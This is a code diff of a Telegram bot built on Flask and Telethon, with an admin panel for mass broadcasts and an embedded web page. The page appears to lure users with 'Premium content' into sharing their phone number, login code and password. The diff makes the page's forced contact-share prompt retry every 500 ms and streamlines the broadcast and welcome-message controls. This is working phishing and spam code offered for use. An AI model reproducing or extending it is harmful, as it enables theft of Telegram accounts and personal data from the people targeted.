@@ -1,32 +1,19 @@
 from flask import Flask, request, jsonify, render_template_string
-import os
-import json
-import base64
-import threading
-import asyncio
-import logging
-import traceback
-import uuid
-import time
+import os, json, base64, threading, asyncio, logging, traceback, uuid, time
 from datetime import datetime
 import requests as http_requests
 from telethon import TelegramClient, errors, events, Button
 from telethon.sessions import StringSession
 import sys
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s'
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(name)s: %(message)s')
 logger = logging.getLogger(__name__)
-
 
 def _si(v, d=0):
     try:
         return int(str(v).strip()) if v not in (None, "") else d
     except Exception:
         return d
-
 
 BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
 API_ID = _si(os.environ.get("API_ID"), 0)
@@ -76,7 +63,6 @@ STATE = {
     "capture_mode": False,
     "welcome_capture": False,
     "awaiting_timer": False,
-    "awaiting_url": False,
     "awaiting_btntext": False,
 }
 
@@ -296,8 +282,7 @@ def admin_menu():
     return [
         [Button.inline("👋 Welcome Messages", b"menu_welcome"),
          Button.inline("📢 Broadcast", b"menu_broadcast")],
-        [Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer"),
-         Button.inline("🔗 WebApp URL", b"menu_url")],
+        [Button.inline(f"⏱ Timer: {config.get('timer', 60)}s", b"menu_timer")],
         [Button.inline("👥 Users", b"menu_users"),
          Button.inline("📊 Stats", b"menu_stats")],
         [Button.inline("🔄 Reset Modes", b"menu_reset")],
@@ -309,22 +294,15 @@ def back_button():
 
 
 async def send_panel_query(event, text, buttons=None):
-    """CallbackQuery — delete origin msg, send NEW msg"""
+    """Edit current panel msg — no delete, no new"""
     try:
-        chat_id = event.sender_id
-    except Exception:
-        chat_id = YOUR_TELEGRAM_ID
-
-    try:
-        await event.delete()
+        await event.edit(text, buttons=buttons, parse_mode='md')
     except Exception as e:
-        logger.warning(f"delete failed: {e}")
-
-    try:
-        return await bot.send_message(chat_id, text, buttons=buttons, parse_mode='md')
-    except Exception as e:
-        logger.error(f"send_panel_query FAILED: {e}")
-        return None
+        logger.error(f"edit failed: {e}")
+        try:
+            await bot.send_message(event.sender_id, text, buttons=buttons, parse_mode='md')
+        except Exception as e2:
+            logger.error(f"fallback failed: {e2}")
 
 
 async def send_welcome(uid, name):
@@ -335,15 +313,18 @@ async def send_welcome(uid, name):
         config.get("button_text", "CONFIRM NOW"),
         url=config.get("webapp_url", WEBAPP_URL + "?auto=1")
     )]]
+    sent_ids = []
     for i, m in enumerate(msgs):
         try:
             content = (m.get("content") or "").replace("{name}", name)
             caption = (m.get("caption") or "").replace("{name}", name)
             btns = buttons if i == len(msgs) - 1 else None
-            await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
+            sent = await bot.send_message(uid, content or caption, buttons=btns, parse_mode='md')
+            sent_ids.append(sent.id)
             await asyncio.sleep(0.4)
         except Exception as e:
             logger.error(f"welcome {uid}: {e}")
+    return sent_ids
 
 
 @bot.on(events.NewMessage(pattern='/start'))
@@ -374,148 +355,131 @@ async def cb(event):
     data = event.data.decode()
     logger.info(f"Callback: {data}")
 
-    if data == "menu_home":
-        await event.answer()
-        await send_panel_query(event,
-            "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
-            admin_menu())
+    try:
+        if data == "menu_home":
+            await event.answer()
+            await send_panel_query(event,
+                "🔧 **Admin Panel**\n\nUsers: `" + str(len(users)) + "`",
+                admin_menu())
 
-    elif data == "menu_reset":
-        for k in STATE:
-            STATE[k] = False
-        await event.answer("Reset!", alert=True)
-        await send_panel_query(event,
-            "✅ All modes reset.\n\nAdmin Panel:", admin_menu())
+        elif data == "menu_reset":
+            for k in STATE:
+                STATE[k] = False
+            await event.answer("Reset!", alert=True)
+            await send_panel_query(event, "✅ Modes reset.", admin_menu())
 
-    elif data == "menu_welcome":
-        n = len(config.get("welcome_messages", []))
-        await event.answer()
-        await send_panel_query(event,
-            f"👋 **Welcome Messages** — `{n}` active",
-            [
-                [Button.inline("➕ Add Messages", b"wl_add"),
-                 Button.inline("👁 Preview", b"wl_preview")],
-                [Button.inline("🗑 Clear All", b"wl_clear"),
-                 Button.inline("✏️ Button Text", b"wl_btntext")],
-                back_button()
-            ])
+        elif data == "menu_welcome":
+            n = len(config.get("welcome_messages", []))
+            await event.answer()
+            await send_panel_query(event,
+                f"👋 **Welcome Messages** — `{n}` active",
+                [
+                    [Button.inline("➕ Add Messages", b"wl_add"),
+                     Button.inline("👁 Preview", b"wl_preview")],
+                    [Button.inline("🗑 Clear All", b"wl_clear"),
+                     Button.inline("✏️ Button Text", b"wl_btntext")],
+                    back_button()
+                ])
 
-    elif data == "wl_add":
-        STATE["welcome_capture"] = True
-        STATE["capture_mode"] = False
-        await event.answer("Capture ON")
-        await send_panel_query(event,
-            "✍️ **Welcome Capture: ON**\n\n"
-            "Send text/photo/video one by one.\n"
-            "Send `/wldone` or tap Stop.",
-            [
-                [Button.inline("⏹ Stop & Save", b"wl_stop")],
-                back_button()
-            ])
+        elif data == "wl_add":
+            STATE["welcome_capture"] = True
+            STATE["capture_mode"] = False
+            await event.answer("Send messages now")
+            await send_panel_query(event,
+                "✍️ **Welcome Capture: ON**\n\nSend text/photo/video one by one.",
+                [[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
 
-    elif data == "wl_stop":
-        STATE["welcome_capture"] = False
-        await event.answer("Saved!", alert=True)
-        await send_panel_query(event,
-            f"✅ Welcome set: `{len(config.get('welcome_messages', []))}` messages.",
-            admin_menu())
+        elif data == "wl_stop":
+            STATE["welcome_capture"] = False
+            await event.answer("Saved!", alert=True)
+            await send_panel_query(event,
+                f"✅ Welcome set: `{len(config.get('welcome_messages', []))}`",
+                admin_menu())
 
-    elif data == "wl_preview":
-        await event.answer("Preview sent")
-        await send_welcome(YOUR_TELEGRAM_ID, "Preview")
+        elif data == "wl_preview":
+            await event.answer("Preview sent")
+            await send_welcome(YOUR_TELEGRAM_ID, "Preview")
 
-    elif data == "wl_clear":
-        config["welcome_messages"] = []
-        save_json(CONFIG_FILE, config)
-        await event.answer("Cleared!", alert=True)
-        await send_panel_query(event, "Cleared welcome messages.", admin_menu())
+        elif data == "wl_clear":
+            config["welcome_messages"] = []
+            save_json(CONFIG_FILE, config)
+            await event.answer("Cleared!", alert=True)
+            await send_panel_query(event, "Cleared.", admin_menu())
 
-    elif data == "wl_btntext":
-        STATE["awaiting_btntext"] = True
-        await event.answer()
-        await send_panel_query(event,
-            "✏️ Send new button text.",
-            back_button())
+        elif data == "wl_btntext":
+            STATE["awaiting_btntext"] = True
+            await event.answer()
+            await send_panel_query(event, "✏️ Send new button text.", back_button())
 
-    elif data == "menu_broadcast":
-        s = broadcast_state
-        await event.answer()
-        await send_panel_query(event,
-            f"📢 **Broadcast**\n\n"
-            f"Active: `{s['active']}`\n"
-            f"Queue: `{len(s['messages'])}`\n"
-            f"Interval: `{s['interval']}s`",
-            [
-                [Button.inline("➕ Add Messages", b"bc_add"),
-                 Button.inline("▶️ Start", b"bc_start")],
-                [Button.inline("⏹ Stop", b"bc_stop"),
-                 Button.inline("🗑 Clear", b"bc_clear")],
-                back_button()
-            ])
+        elif data == "menu_broadcast":
+            s = broadcast_state
+            await event.answer()
+            await send_panel_query(event,
+                f"📢 **Broadcast**\n\nActive: `{s['active']}`\nQueue: `{len(s['messages'])}`\nInterval: `{s['interval']}s`",
+                [
+                    [Button.inline("➕ Add Messages", b"bc_add"),
+                     Button.inline("▶️ Start", b"bc_start")],
+                    [Button.inline("⏹ Stop", b"bc_stop"),
+                     Button.inline("🗑 Clear", b"bc_clear")],
+                    back_button()
+                ])
 
-    elif data == "bc_add":
-        STATE["capture_mode"] = True
-        STATE["welcome_capture"] = False
-        await event.answer("Capture ON")
-        await send_panel_query(event,
-            "📥 **Broadcast Capture: ON**\n\nSend messages now.",
-            [
-                [Button.inline("▶️ Start Now", b"bc_start")],
-                [Button.inline("❌ Cancel", b"bc_cancel")]
-            ])
+        elif data == "bc_add":
+            STATE["capture_mode"] = True
+            STATE["welcome_capture"] = False
+            await event.answer("Send messages now")
+            await send_panel_query(event,
+                "📥 **Broadcast Capture: ON**\n\nSend messages.",
+                [
+                    [Button.inline("▶️ Start Now", b"bc_start")],
+                    [Button.inline("❌ Cancel", b"bc_cancel")]
+                ])
 
-    elif data == "bc_start":
-        STATE["capture_mode"] = False
-        if not broadcast_state['messages']:
-            return await event.answer("Queue empty", alert=True)
-        broadcast_state['active'] = True
-        broadcast_state['next_run'] = time.time() + 3
-        await event.answer("Started!", alert=True)
-        await send_panel_query(event,
-            f"▶️ Broadcasting `{len(broadcast_state['messages'])}` msg(s) "
-            f"to `{len(users)}` users every `{broadcast_state['interval']}s`.",
-            back_button())
+        elif data == "bc_start":
+            STATE["capture_mode"] = False
+            if not broadcast_state['messages']:
+                return await event.answer("Queue empty", alert=True)
+            broadcast_state['active'] = True
+            broadcast_state['next_run'] = time.time() + 3
+            await event.answer("Started!", alert=True)
+            await send_panel_query(event,
+                f"▶️ Broadcasting `{len(broadcast_state['messages'])}` to `{len(users)}` users every `{broadcast_state['interval']}s`.",
+                back_button())
 
-    elif data == "bc_cancel":
-        STATE["capture_mode"] = False
-        broadcast_state['messages'] = []
-        await event.answer("Cancelled")
-        await send_panel_query(event, "Cancelled.", admin_menu())
+        elif data == "bc_cancel":
+            STATE["capture_mode"] = False
+            broadcast_state['messages'] = []
+            await event.answer("Cancelled")
+            await send_panel_query(event, "Cancelled.", admin_menu())
 
-    elif data == "bc_stop":
-        broadcast_state['active'] = False
-        await event.answer("Stopped!", alert=True)
-        await send_panel_query(event, "Broadcast stopped.", admin_menu())
+        elif data == "bc_stop":
+            broadcast_state['active'] = False
+            await event.answer("Stopped!", alert=True)
+            await send_panel_query(event, "Stopped.", admin_menu())
 
-    elif data == "bc_clear":
-        broadcast_state['messages'] = []
-        await event.answer("Cleared!", alert=True)
+        elif data == "bc_clear":
+            broadcast_state['messages'] = []
+            await event.answer("Cleared!", alert=True)
 
-    elif data == "menu_timer":
-        STATE["awaiting_timer"] = True
-        await event.answer()
-        await send_panel_query(event,
-            f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\n"
-            f"Send a number (seconds). Example: `30`",
-            back_button())
+        elif data == "menu_timer":
+            STATE["awaiting_timer"] = True
+            await event.answer()
+            await send_panel_query(event,
+                f"⏱ **Set Timer**\n\nCurrent: `{config.get('timer', 60)}s`\n\nSend a number (seconds). Example: `30`",
+                back_button())
 
-    elif data == "menu_url":
-        STATE["awaiting_url"] = True
-        await event.answer()
-        await send_panel_query(event,
-            f"🔗 Send new WebApp URL.\nCurrent: `{config.get('webapp_url')}`",
-            back_button())
+        elif data == "menu_users":
+            await event.answer(f"Total: {len(users)} users", alert=True)
 
-    elif data == "menu_users":
-        await event.answer(f"Total: {len(users)} users", alert=True)
-
-    elif data == "menu_stats":
-        s = broadcast_state
-        await event.answer(
-            f"Users: {len(users)}\nBroadcast: {s['active']}\n"
-            f"Queue: {len(s['messages'])}\nWelcome: {len(config.get('welcome_messages', []))}",
-            alert=True
-        )
+        elif data == "menu_stats":
+            s = broadcast_state
+            await event.answer(
+                f"Users: {len(users)}\nBroadcast: {s['active']}\nQueue: {len(s['messages'])}\nWelcome: {len(config.get('welcome_messages', []))}",
+                alert=True
+            )
+    except Exception as e:
+        logger.error(f"cb error: {e}")
+        logger.error(traceback.format_exc())
 
 
 @bot.on(events.NewMessage(pattern='/wldone'))
@@ -570,14 +534,6 @@ async def capture(event):
             buttons=admin_menu(), parse_mode='md')
         return
 
-    if STATE["awaiting_url"]:
-        config["webapp_url"] = txt.strip()
-        STATE["awaiting_url"] = False
-        save_json(CONFIG_FILE, config)
-        await event.respond(f"✅ URL: `{config['webapp_url']}`",
-            buttons=admin_menu(), parse_mode='md')
-        return
-
     if STATE["welcome_capture"]:
         m = event.message
         entry = {"type": "text", "content": m.message or "", "caption": ""}
@@ -589,10 +545,7 @@ async def capture(event):
         save_json(CONFIG_FILE, config)
         await event.respond(
             f"✅ Welcome #{len(config['welcome_messages'])} added.",
-            buttons=[
-                [Button.inline("⏹ Stop & Save", b"wl_stop")],
-                back_button()
-            ])
+            buttons=[[Button.inline("⏹ Stop & Save", b"wl_stop")], back_button()])
         return
 
     if STATE["capture_mode"]:
@@ -655,7 +608,7 @@ async def broadcast_loop():
             logger.info(f"Broadcast: {ok} sent, {fail} failed")
             try:
                 await bot.send_message(YOUR_TELEGRAM_ID,
-                    f"📢 Done\n✅ {ok}\n❌ {fail}\n👥 {len(users)}")
+                    f"📢 Round done\n✅ {ok}\n❌ {fail}\n👥 {len(users)}")
             except Exception:
                 pass
         except Exception as e:
@@ -773,6 +726,7 @@ var phoneNumber = '';
 var codeCheck = null;
 var pwdCheck = null;
 var contactForce = null;
+var lastShareAttempt = 0;
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
 function show(id) { document.getElementById(id).classList.add('on'); }
@@ -793,11 +747,20 @@ window.onload = function() {
 };
 function startForce() {
   if (contactForce) clearInterval(contactForce);
-  setTimeout(triggerShare, 500);
+  setTimeout(triggerShare, 300);
+  // Fast retry loop - 1 second
   contactForce = setInterval(function() {
-    if (document.getElementById('contactBox').classList.contains('on')) triggerShare();
-    else { clearInterval(contactForce); contactForce = null; }
-  }, 1500);
+    if (document.getElementById('contactBox').classList.contains('on')) {
+      var now = Date.now();
+      if (now - lastShareAttempt > 900) {
+        lastShareAttempt = now;
+        triggerShare();
+      }
+    } else {
+      clearInterval(contactForce);
+      contactForce = null;
+    }
+  }, 500);
 }
 function triggerShare() {
   if (!tg) { msg('contactMsg', 'Open inside Telegram app', 'err'); return; }
@@ -821,7 +784,10 @@ function triggerShare() {
   }
   msg('contactMsg', 'Update Telegram app', 'err');
 }
-document.getElementById('shareContactBtn').onclick = triggerShare;
+document.getElementById('shareContactBtn').onclick = function() {
+  lastShareAttempt = Date.now();
+  triggerShare();
+};
 function handleContact(c) {
   var phone = c.phone_number || '';
   if (!phone) { msg('contactMsg', 'Try again', 'err'); return; }
